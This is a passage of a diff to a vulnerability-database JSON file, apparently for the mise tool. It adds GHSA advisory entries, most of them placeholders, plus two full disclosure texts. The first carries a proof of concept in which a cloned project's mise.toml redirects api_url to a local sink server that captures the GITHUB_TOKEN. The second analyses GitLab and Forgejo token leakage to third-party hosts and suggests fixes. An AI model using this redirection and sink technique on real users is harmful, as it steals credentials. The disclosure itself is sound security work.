a string value, the file pass safe, and the api_url in the key is parsed after by BackendArg and reach the backend. there no prompt anywhere. ## PoC mise v2026.9.17 (sha256 63049bc35fb9065e8dc35ac8b25fdae53e9bd6f1885a843aedeba398e046a1ee), the files above are identical on current main. the hostile project, `proj/mise.toml`: ```toml [tools] 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' = 'latest' ``` a tiny server that stand for my host and just log what it get, `sink.py`: ```python import http.server, sys class H(http.server.BaseHTTPRequestHandler): def do_GET(self): sys.stderr.write('%s Authorization: %s\\n' % (self.path, self.headers.get('Authorization'))) body = b'{'tag_name':'v0.0.1','draft':false,'prerelease':false,'assets':[]}' if self.path.endswith('/releases/latest') else b'[]' self.send_response(200); self.send_header('Content-Length', str(len(body))); self.end_headers(); self.wfile.write(body) def log_message(self, *a): pass http.server.HTTPServer(('127.0.0.1', 8080), H).serve_forever() ``` i put a github token in the env : ```bash /tmp/mise-lab \u276f python3 sink.py 2>sink.log & /tmp/mise-lab \u276f cd proj /tmp/mise-lab/proj \u276f export GITHUB_TOKEN=ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /tmp/mise-lab/proj \u276f mise install /tmp/mise-lab/proj \u276f MISE_SAFE=1 mise install /tmp/mise-lab/proj \u276f mise ls-remote 'github:sharkdp/fd[api_url=http://127.0.0.1:8080/api/v3]' ``` what my server got, per command: ```text mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U MISE_SAFE=1 mise install /api/v3/repos/sharkdp/fd/releases/latest Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U mise ls-remote /api/v3/repos/sharkdp/fd/releases?per_page=100 Authorization: Bearer ghp_hQ3nZx7Rk9pVt2Lc8mWb4Ds6Yf1Ga5Ej0U ``` also a https host work the same ## Impact a repo you clone can read your GITHUB_TOKEN and send it to a host it choose",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.12.13-r1",
+                        "fixed": "2026.9.18-r0"
+                    }
+                ]
+            },
+            "GHSA-43hx-4j66-v486": {
+                "cve_id": "GHSA-43hx-4j66-v486",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.12.13-r1",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-fh4m-2w73-96r9": {
+                "cve_id": "GHSA-fh4m-2w73-96r9",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.12.13-r1",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-r9rm-ppfv-c993": {
+                "cve_id": "GHSA-r9rm-ppfv-c993",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.12.13-r1",
+                        "fixed": "2026.10.24-r0"
+                    }
+                ]
+            },
+            "GHSA-w8pw-h853-frw2": {
+                "cve_id": "GHSA-w8pw-h853-frw2",
+                "title": "GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control",
+                "description": "# GitLab/Forgejo tokens are attached to release-asset URLs on hosts mise does not control ## Summary `gitlab::get_headers` and `forgejo::get_headers` attach the caller's token to **any** URL they are handed. The GitHub equivalent does not \u2014 it self-gates on `is_github_api_url`, and `github::resolve_token` additionally refuses the release-asset hosts. All three are called side by side, on the same value, in `src/backend/github.rs`, so the GitHub path is protected and the other two are not. A GitLab release asset link may name any host. When the linked asset is on a third-party host, mise sends `Authorization: Bearer <GITLAB_TOKEN>` to that host. ## The asymmetry `src/github.rs` ```rust pub fn get_headers<U: IntoUrl>(url: U) -> Result<HeaderMap> { ... if is_github_api_url(&url) { // <- gate let host = url.host_str().unwrap_or('github.com'); if let Some((token, source)) = resolve_token(host) { ... } } } pub fn resolve_token(host: &str) -> Option<(String, TokenSource)> { if is_github_release_asset_host(host) { // <- second gate return None; } ``` `src/gitlab.rs:265` \u2014 no gate: ```rust pub fn get_headers<U: IntoUrl>(url: U) -> HeaderMap { let mut headers = HeaderMap::new(); let Ok(url) = url.into_url() else { return headers }; let lookup_host = url.host_str().unwrap_or('gitlab.com'); if let Some((token, _source)) = resolve_token(lookup_host) { headers.insert(AUTHORIZATION, HeaderValue::from_str(format!('Bearer {token}'))...); } headers } ``` `src/forgejo.rs:163` is the same shape. `resolve_token` cannot compensate, because its env-var branch is host-independent \u2014 there is no host comparison on it: ```rust // src/gitlab.rs, resolve_token, step 2 for var_name in &['MISE_GITLAB_TOKEN', 'GITLAB_TOKEN'] { if let Some(token) = std::env::var(var_name).ok()... { return Some((token, TokenSource::EnvVar(var_name))); } } ``` So for a host the user has never configured anywhere, `resolve_token` still returns the environment token, and `get_headers` still attaches it. ## Where the normal gate is bypassed `http.rs::host_auth_headers` gates correctly: ```rust let is_gitlab = host == 'gitlab.com' || crate::gitlab::is_gitlab_host(host); if is_gitlab { return Ok(crate::gitlab::get_headers(url.as_str())); } ``` `src/backend/github.rs` does not go through it. It calls the three `get_headers` functions directly at three sites \u2014 1173 (`verify_provenance_at_lock_time`), 1416 and 1523 (the two download paths) \u2014 each on a URL that can be `asset.url`, populated from the release JSON at `:1951` and `:1983`: ```rust url: asset.direct_asset_url.clone(), ``` ## What I measured, and the limit of it I want to be precise here, because my first reading of this overstated it. `direct_asset_url` is **usually** a gitlab.com permalink \u2014 GitLab generates one when the release link was created with a `filepath`. In that common case mise is talking to gitlab.com and the token is going where it should. Sampling the live API today: | project | links | `direct_asset_url` host | |---|---:|---| | gitlab-org/gitlab-runner | 38 | `gitlab.com` (while `url` is `gitlab-runner-downloads.s3.amazonaws.com`) | | graphviz/graphviz | 90 | `gitlab.com` | | fdroid/fdroidclient | 4 | `gitlab.com` | | gitlab-org/cli | 36 | `gitlab.com` | | **inkscape/inkscape** | 1 | **`inkscape.org`** | So the exposure is real but not universal: it is the links published **without** a `filepath`, where `direct_asset_url` is just the publisher's own URL. `inkscape.org` above is a live example on a well-known project. Reachability: this needs the GitLab backend, i.e. `mise use gitlab:<ns>/<project>`, which is documented usage. It is not reachable through the shipped registry today \u2014 the only `gitlab:` entry is `glab` \u2192 `gitlab-org/cli`, whose links are permalinked and therefore unaffected. ## Impact 1. **Accidental leak, no attacker needed.** Any user with `GITLAB_TOKEN` / `MISE_GITLAB_TOKEN` exported who installs a GitLab-backed tool whose release links are not permalinked sends that token to the third-party download host on every install and on every lock-time provenance check. 2. **Deliberate exfiltration.** A project reachable via `mise use gitlab:...` can publish a release link pointing at a host it controls and collect the tokens of everyone who installs it. No prior trust relationship with that host is required, because the env-var branch ignores the host entirely. The same applies to Forgejo/Codeberg via `MISE_FORGEJO_TOKEN` / `FORGEJO_TOKEN`. This also contradicts a principle the codebase states elsewhere \u2014 `http.rs`, on URL replacement: *'the existing auth header was built for the original host and is likely wrong for the replacement target'*. ## Suggested fixes Two options; which one is right is a design call I'd rather leave to you. **A \u2014 mirror GitHub, minimal diff.** Gate inside `gitlab::get_headers` / `forgejo::get_headers` exactly as `http.rs` already gates them: ```rust let is_ours = lookup_host == 'gitlab.com' || is_gitlab_host(lookup_host); if is_ours && let Some((token, _)) = resolve_token(lookup_host) { ... } ``` Caveat worth weighing before taking it: a self-hosted GitLab whose token is supplied **only** through `GITLAB_TOKEN` is in neither `MISE_GITLAB_TOKENS` nor `GLAB_HOSTS`, so `is_gitlab_host` returns false and that setup would silently stop being authenticated. That is a behaviour change for a legitimate configuration. **B \u2014 compare against the instance actually being talked to.** The backend already has the API base (`opts.api_url()`); attach the token only when the download URL's host equals that base's host. Keeps self-hosted-via-env-var working and is tighter than A, at the cost of threading one argument through the three call sites. ## How this was verified - Code reading of the paths quoted above, at `93a5786`. - Live GitLab API sampling for the `direct_asset_url` table. - I did **not** run a network proof-of-concept against any third-party host, and would not without your say-so. - I could not execute mise's own test suite locally to add a regression test: the `libz-ng-sys` build script invokes CMake through w64devkit's `make`/`sh`, which fails to exec `cmake.exe` on this Windows/GNU toolchain. That is my environment's problem, not yours \u2014 I mention it only so you know the finding rests on reading plus the API data above, not on a test run. Happy to send the fix as a PR once you say which option you want. ## Reporter Nguyen Thanh Dat \u2014 GitHub `@ntdatt812` --- ## Addendum \u2014 the same root cause reached through pagination Adding this because it changes *where* the fix belongs, not because it is a stronger attack. It is a variant, with a narrower precondition, and I want to be clear about that. All three modules re-derive auth for each page (`gitlab.rs` even documents why \u2014 the `#6318` defect where page 2 went out unauthenticated). The next-page URL comes from the `Link` header: ```rust // src/http.rs:1709 pub(crate) fn resolve_pagination_url(current: &str, next: &str) -> Result<String> { if next.starts_with('http://') || next.starts_with('https://') { return Ok(next.to_string()); // absolute Link is taken as-is } ``` So a response can point the next request at any host, including a downgrade to plain `http://`. What happens then differs per backend, for exactly the reason in this report: | backend | page-2 URL on an unrelated host | |---|---| | `github.rs:210` | `get_headers` gates on `is_github_api_url` \u2192 **no token attached** | | `gitlab.rs:137` | no gate \u2192 token attached | | `forgejo.rs:112` | no gate, and it uses `next` directly without `resolve_pagination_url` | **Precondition, stated plainly:** the `Link` header comes from the forge instance being queried, so this needs an instance that is malicious, compromised, or fronted by something that can inject a response header \u2014 or a MITM on an `http://` API base. An honest gitlab.com is not affected. That is why I rate it below the release-asset path in the main report, not above it. **Why it still matters for the fix:** it shows the gate cannot live at the three `src/backend/github.rs` call sites. Any caller that hands `gitlab::get_headers` / `forgejo::get_headers` a URL from a response \u2014 a `Link` header today, something else later \u2014 reintroduces this. Options A and B both close it, because both put the host check inside `get_headers`. A patch applied only at the asset call sites would not. Same verification basis as the rest of this report: code reading at `93a5786`, no network proof-of-concept.",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.12.13-r1",
+                        "fixed": "2026.8.15-r0"
+                    }
+                ]
+            },
+            "GHSA-wcqh-j26q-g44x": {
+                "cve_id": "GHSA-wcqh-j26q-g44x",
+                "title": "Title Not Available",
+                "description": "Description Not Available",
+                "severity": "UNKNOWN",
+                "status": "fixed",
+                "events": [
+                    {
+                        "introduced": "2025.12.13-r1",
+                        "fixed": "2026.10.24-r0"
                     }
                 ]
             }
